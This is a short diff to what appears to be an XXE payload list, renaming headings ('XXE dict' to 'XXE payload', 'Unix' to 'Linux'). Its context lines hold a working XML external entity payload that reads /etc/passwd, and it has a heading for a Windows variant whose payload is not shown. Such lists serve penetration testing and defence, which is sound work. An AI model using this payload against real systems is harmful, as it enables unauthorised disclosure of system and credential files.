@@ -1,6 +1,6 @@
-# XXE dict
+# XXE payload
 
-# for Unix target
+# for Linux target
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 
 # for Windows target
